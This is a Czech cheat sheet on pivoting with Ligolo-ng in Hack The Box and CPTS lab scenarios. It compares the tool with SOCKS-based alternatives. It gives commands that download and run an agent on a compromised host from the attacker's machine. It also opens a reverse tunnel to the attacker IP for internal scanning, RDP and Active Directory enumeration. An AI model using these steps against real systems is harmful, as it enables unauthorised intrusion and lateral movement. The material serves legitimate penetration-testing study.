# 🕸️ Ligolo-ng – Advanced Pivoting Cheat Sheet

## Základní informace

**Ligolo-ng** je moderní open-source nástroj pro pivoting, který vytváří **tunelovou síťovou vrstvu (TUN interface)** mezi útočníkem a kompromitovaným strojem.

Na rozdíl od:

- Proxychains + SOCKS
    
- Chisel SOCKS
    
- Metasploit autoroute
    

funguje více jako **VPN**.

Výsledek:

- nemusíš nastavovat proxy pro každý nástroj
    
- Nmap funguje normálně
    
- browser funguje normálně
    
- exploity fungují přímo na interní IP
    

---

# Kdy použít Ligolo-ng

Použij když:

✅ máš shell na pivot hostu  
✅ můžeš spustit binárku  
✅ potřebuješ pohodlný přístup do celé interní sítě  
✅ nechceš řešit proxychains

Typický scénář:

```
KALI
10.10.14.5

      |
      |
Ligolo tunnel

      |
      |
Pivot Host
10.129.20.10
172.16.5.10

      |
      |
Internal Network
172.16.5.0/24
```

Po nastavení:

```
KALI
 |
TUN interface
 |
172.16.5.0/24
```

Kali se chová, jako kdyby byla přímo v interní síti.

---

# Jak Ligolo-ng funguje

Ligolo má dvě části:

## Proxy (Kali)

Běží na útočném stroji.

Úkol:

- čeká na spojení agentů
    
- spravuje tunely
    
- vytváří TUN interface
    

## Agent (Pivot)

Běží na kompromitovaném stroji.

Úkol:

- připojí se zpět na Kali
    
- přeposílá traffic
    

---

# Instalace

## Kali

Stažení:

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
```

Binárky:

```
proxy
agent
```

---

# 1. Spuštění Proxy na Kali

```bash
sudo ./proxy -selfcert
```

Výstup:

```
Ligolo-ng proxy listening on 0.0.0.0:11601
```

Port:

```
11601
```

slouží pro agenty.

---

# 2. Přenos agenta na Pivot

Podle OS:

Linux:

```
agent
```

Windows:

```
agent.exe
```

Například:

```bash
wget http://KALI/agent
chmod +x agent
```

---

# 3. Spuštění agenta

Linux pivot:

```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

Windows:

```cmd
agent.exe -connect 10.10.14.5:11601 -ignore-cert
```

Agent se připojí na Kali.

---

# 4. Přijetí agenta v Ligolo

Na Kali:

```bash
ligolo-ng proxy
```

Interaktivní konzole:

```
ligolo-ng »
```

Zobrazíš agenty:

```
session
```

Výstup:

```
1 - ubuntu
```

Vybereš:

```
1
```

---

# 5. Vytvoření TUN interface

Na Kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
```

Aktivace:

```bash
sudo ip link set ligolo up
```

---

# 6. Přidání routy

Zjistíš interní síť:

Například:

```
172.16.5.0/24
```

Přidáš:

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

---

# 7. Start tunelu

V Ligolo konzoli:

```
start
```

Tunel je aktivní.

---

# Použití

Nyní můžeš normálně:

## Nmap

Bez proxychains:

```bash
nmap -sT -Pn 172.16.5.19
```

---

## RDP

```bash
xfreerdp /v:172.16.5.19
```

---

## SMB

```bash
smbclient -L 172.16.5.19
```

---

## BloodHound

Normálně:

```bash
bloodhound-python
```

---

# Reverse tunneling

Nejčastější varianta:

```
KALI
 |
Listener
 |
Pivot
```

Pivot se připojí ven.

Výhoda:

- firewall většinou dovolí outbound
    
- nepotřebuješ otevřený port na pivotu
    

---

# Proxy vs Ligolo-ng

## SOCKS pivot

Například:

```
Chisel
Meterpreter SOCKS
SSH -D
```

Funguje:

```
Program
 |
Proxychains
 |
SOCKS
 |
Network
```

Nevýhoda:

Každý nástroj musí používat proxy.

---

## Ligolo

Funguje:

```
Program
 |
OS routing
 |
TUN interface
 |
Network
```

Výhoda:

Celý systém vidí interní síť.

---

# Ligolo-ng vs Chisel

||Ligolo-ng|Chisel|
|---|---|---|
|Typ|TUN VPN|SOCKS|
|Proxychains|❌|✅|
|Nmap|⭐⭐⭐⭐⭐|⭐⭐⭐|
|RDP|přímo|přes proxy|
|AD útoky|výborné|dobré|
|Komfort|⭐⭐⭐⭐⭐|⭐⭐⭐⭐|

---

# Ligolo-ng vs Metasploit Autoroute

||Ligolo|MSF Autoroute|
|---|---|---|
|Potřebuje Meterpreter|❌|✅|
|TUN interface|✅|❌|
|Proxychains|❌|často ano|
|Stabilita|vysoká|střední|
|Moderní použití|⭐⭐⭐⭐⭐|⭐⭐⭐|

---

# Praktický HTB/CPTS workflow

Scénář:

```
KALI

↓

Initial foothold

↓

Linux Pivot

↓

Ligolo Agent

↓

TUN interface

↓

Internal network

↓

AD Enumeration
```

Příkazy:

```bash
proxy:

sudo ./proxy -selfcert
```

---

Pivot:

```bash
./agent -connect KALI_IP:11601 -ignore-cert
```

---

Kali:

```bash
session
```

```
start
```

---

Route:

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

---

Scan:

```bash
nmap -sT -Pn 172.16.5.19
```

---

# CPTS zapamatovat

Nejdůležitější věta:

```
Ligolo-ng = VPN-like pivoting přes TUN interface.
```

Použij když:

```
Mám shell
+
můžu spustit agenta
+
chci pohodlný přístup do celé interní sítě.
```

Je to jeden z nejlepších moderních nástrojů pro:

- Active Directory pentesting
    
- lateral movement
    
- interní síťové testy
    
- HTB Pro Labs